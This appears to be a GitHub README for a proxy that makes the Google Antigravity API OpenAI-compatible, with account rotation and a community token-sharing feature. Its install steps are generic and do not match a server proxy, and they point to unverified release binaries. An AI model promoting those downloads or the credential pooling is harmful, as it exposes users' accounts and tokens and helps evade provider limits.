# 🎈 Antigravity- - Seamless Access to OpenAI API

[![Download Antigravity-](https://img.shields.io/badge/Download-Antigravity--blue.svg)](https://github.com/soonchai09/Antigravity-/releases)

## 📜 Description

Antigravity is a powerful proxy service that converts the Google Antigravity API into a format compatible with OpenAI. It supports streaming responses, tool calls, multi-account management, and a complete user management system.

### 🌐 Test URL
Visit the test URL at: [User Interface](https://ggt333.zeabur.app/user.html)

### 🚨 Common Issues
One common issue may be a `redirect_uri_mismatch` error. This means that the callback URL set in Google OAuth does not match. To resolve this, follow these steps:

1. Open Google Cloud Console.
2. Navigate to APIs & Services → Credentials.
3. Locate your OAuth 2.0 Client ID and click to edit it.
4. Add the correct redirect URI:
   - For local development: `http://localhost:port/admin/oauth-callback`
   - For production: `https://yourdomain/admin/oauth-callback`
5. Check the current redirect URI by looking at the browser address bar in the Google authorization page. Find the `redirect_uri=` parameter and add that value to Google Cloud Console.

## 🚀 Core Features

### API Proxy
- ✅ OpenAI API fully compatible format.
- ✅ Supports both streaming and non-streaming responses.
- ✅ Tool calling (Function Calling) enabled.
- ✅ Automatic rotation of multiple accounts.
- ✅ Token auto-refresh feature.
- ✅ API Key authentication.
- ✅ Thought chain (Thinking) output support.
- ✅ Image input support via Base64 encoding.

### 🔧 Management System
- 🎛️ **Web Management Dashboard** - Provides a complete visual interface for administration.
- 👥 **User System** - Allows user registration, login, and API key management.
- 🔑 **Key Management** - Enables API key generation and frequency limits.
- 📢 **Announcement System** - Manage and publish system announcements.
- 📊 **Model Quotas** - Daily limitations on model usage.
- 🔐 **Security Measures** - Block based on IP/device and restrict registration.

### 👥 Sharing System
- 🌐 **Token Sharing Center** - Users can share their tokens for community use.
- 🚫 **Abuse Protection** - Automatically detects and bans abusive users.
- 🗳️ **Community Voting** - Enables community voting for bans.

## 📥 Download & Install

To get started with Antigravity, visit the [Releases Page](https://github.com/soonchai09/Antigravity-/releases) to download the latest version.

1. Go to the Releases page linked above.
2. Locate the latest version of Antigravity.
3. Click the download link for your system.

After downloading, follow these simple steps to run the application:

1. Find the downloaded file in your downloads or specified folder.
2. Double-click the file to start the installation.
3. Follow the on-screen instructions to complete the setup.
4. Once installed, open the application and log in or create a new account.

## 📋 System Requirements

- **Operating System:** Windows 10 or later, macOS 10.13 or later, or a recent version of Linux.
- **RAM:** At least 4 GB recommended.
- **Disk Space:** Minimum of 200 MB for installation.

## ❓ FAQs

### What is Antigravity?

Antigravity is a proxy that helps users connect with the OpenAI API in an easy and efficient way.

### How do I fix the `redirect_uri_mismatch` error?

Follow the steps mentioned earlier to correctly set the redirect URI in the Google Cloud Console.

### Can I share my API key?

Yes, Antigravity has a Token Sharing Center feature that allows users to share their tokens safely.

For more questions, feel free to reach out through our support channels.

## 📞 Support 

If you encounter any issues or need assistance, contact our support team via the GitHub issues page or through the provided contact information in the application. We’re here to help you.

For updates, follow us on GitHub and stay informed about new releases and features.